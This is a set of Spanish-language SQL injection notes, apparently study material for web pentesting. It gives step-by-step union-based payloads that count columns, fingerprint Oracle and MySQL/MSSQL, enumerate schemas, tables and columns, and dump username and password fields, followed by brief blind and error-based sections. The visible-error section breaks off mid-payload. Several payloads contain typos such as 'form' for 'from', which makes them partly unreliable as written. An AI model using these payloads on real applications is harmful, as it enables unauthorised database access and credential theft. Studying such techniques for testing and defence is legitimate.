# Identificación de versión y motor de base de datos
### Oracle
Identificar el numero de columnas
`' order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select 'a','b'-- -` | `' union select 1,2-- -` | `' union select NULL,NULL-- -`, al no mostrarnos nada es una pista de que puede ser una base de datos Oracle para ello deberemos referenciar a una tabla
`' union select 'a','b' from dual-- -`, dual es una tabla que esta siempre presente en las beses de datos de Oracle

Para extraer la versión
`' union select 'a',banner from v$version-- -`, nos devolverá toda la información de la base de datos

### MySQL y MSSQL
Identificar el numero de columnas
`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select 'a','b'-- -` | `' union select 1,2-- -` | `' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select en la pagina por lo cual identificamos que es una base de datos MySQL o MSSQL

Para extraer la versión
`' union select 1,@@version-- -`, nos devolverá toda la información de la base de datos

# Listar numero de columnas de una tabla

### Identificando cadenas nulas
Identificar el numero de columnas
`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select, en este caso nos devolvería una cadena de valores vacíos

### Identificando cadenas con texto
Identificar el numero de columnas
`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select, en este caso nos devolvería una cadena de valores vacíos

Si queremos encontrara una cadena por ejemplo CADENA123
`' union select NULL,CADENA123-- -` y nos mostrara esta cadena

### Identificando datos de otras tablas
Identificar el numero de columnas
`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select, al no devolvernos error podemos buscar en otra tabla

Buscar las bases de datos disponibles
`' union select NULL,schema_name form information_schema.schemata-- -` nos muestra las bases de datos

Usar una base de datos que nos interesa y mostrar sus tablas
`' union select NULL,table_name form information_schema.tables where table_schema='nombrebbdd'-- -`

Ver las columnas de la tabla que nos interesa
`' union select NULL,column_name form information_schema.columns where table_schema='nombrebbdd' and table_name='nombretabla'-- -`

Ver datos de las columnas de la tabla seleccionada
`' union select username,password form 'nombretabla'.'nombrecolumna'-- -`


### Listar múltiples valores en una sola columna
Identificar el numero de columnas
`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select, al no devolvernos error podemos buscar en otra tabla

Buscar las bases de datos disponibles
`' union select NULL,schema_name form information_schema.schemata-- -` nos muestra las bases de datos

Usar una base de datos que nos interesa y mostrar sus tablas
`' union select NULL,table_name form information_schema.tables where table_schema='nombrebbdd'-- -`

Ver las columnas de la tabla que nos interesa
`' union select NULL,column_name form information_schema.columns where table_schema='nombrebbdd' and table_name='nombretabla'-- -`

Concatenar el contenido en una sola columna
`' union select NULL,username||':'||password form nombretabla-- -`

# Listar contenido de las bases de datos

### Oracle
Identificar el numero de columnas
`' order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select 'a','b' from dual-- -` | `' union select 1,2 from dual-- -` | `' union select NULL,NULL from dual-- -`, si hubiese tres columnas seria 1,2,3 etc, hay que poner el dual pur que en Oracle siempre hay que llamar a una tabla

Mostrar el contenido de todas las tablas
`' union select NULL,table_name from all_tables-- -`

Mostar información de la tabla que nos interesa
`' union select NULL,colum_name from all_tab_columns where table_name='nombretabla'-- -`

Mostrar el contenido de la tabla seleccionada
`' union select username,password from nombretabla-- -`


### MySQL y MSSQL
Identificar el numero de columnas
`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error

Una vez ya hemos identificado las columnas debemos probar con un
`' union select 'a','b'-- -` | `' union select 1,2-- -` | `' union select NULL,NULL-- -`, si hubiese tres columnas seria 1,2,3 etc

Para enumerar las bases de datos existentes
`' union select 1,schema_name from information_schema.schemata-- -`

Acceder a las tablas de una de las bases de datos existentes
`' union select 1,table_name from information_schema.tables where table_schema='nombrebbdd'-- -`

Enumerar las columnas de una de las tablas de la base de datos existente
`' union select 1,colum_name from information_schema.columns where table_schema='nombrebbdd' and table_name='nombretabla'-- -`

Seleccionar los campos de las columnas de una tabla de una base de datos existente
`' union select username,password from nombrebbdd.nombretabla-- -`

También se pude jugar con concat o group_concat (0x3a hace referencia a ':' )
`' union select 1,concat(username,0x3a,password) from nombretabla.nombrecolumna-- -`
`' union select 1,group_concat(username,0x3a,password) from nombretabla.nombrecolumna-- -`

# Inyección Blind (Ciega)
### Con respuestas condicionales
Interceptamos la petición y vemos que no se nos muestran errores en la respuesta de la solicitud en la pagina por lo que deberemos ir viendo si se produce algún cambio en la web para ver esto tendremos que usar el `'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo

Una vez identificadas las columnas existentes usaremos `' union select NULL,NULL-- -` | `' union select 'a','b'-- -` | `' union select 1,2-- -` al no ver las cadenas reflejadas en la web vamos a ciegas

Por ejemplo identificamos que se muestra en pantalla un mensaje como `Welcome`, si durante la identificación de columnas vemos que desaparece seria un símil a un error y cuando no desaparece no.
Con estas identificadas haremos lo mismo con la introducción de cadenas de texto, numéricas o nulas, viendo cual admite y cual no, lo podemos saber si el `Welcome` aparece, quiere decir que es valida o no aparece, quiere decir que no es valida.

 [^1 En resumen nos tenemos que basar en el mensaje de `Welcome` para determinar cuando ciertos caracteres existen o no en las cadenas y tablas de las bases de datos]

### Con errores condicionales
En este tipo de inyección nos basaremos en errores en los códigos de respuesta, siempre que la respuesta que nos muestre sea el código de estado igual a la respuesta original es que vamos por el buen camino


# Inyección basada en errores visibles
Se acontece cuando hacemos una inyección por ejemplo al introducir una `'` y se nos muestra un error por pantalla, como siempre primero identificaremos el numero de columnas, `'order by 5-- -` a continuación con las columnas identificadas

Procedemos a ver de que forma se reflejan los errores y con que usando `' union select NULL,NULL-- -` | `' union select 'a','b'-- -` | `' union select 1,2-- -`, en caso de que no se me muestre el error de forma visible podemos usar `'or 1=cast((select 1) as INT)-- -`, con este ejemplo lo que hacemos es que el `1` lo trate como un tipo de dato `INT`, siendo la misma query que ejecutar `' or 1=1-- -`.

Lo que tenemos que hacer para que el error se muestre ya que con lo anterior no se mostrara es introducir una cadena de texto y convertila a un valor `INT`, como es el caso `' or `

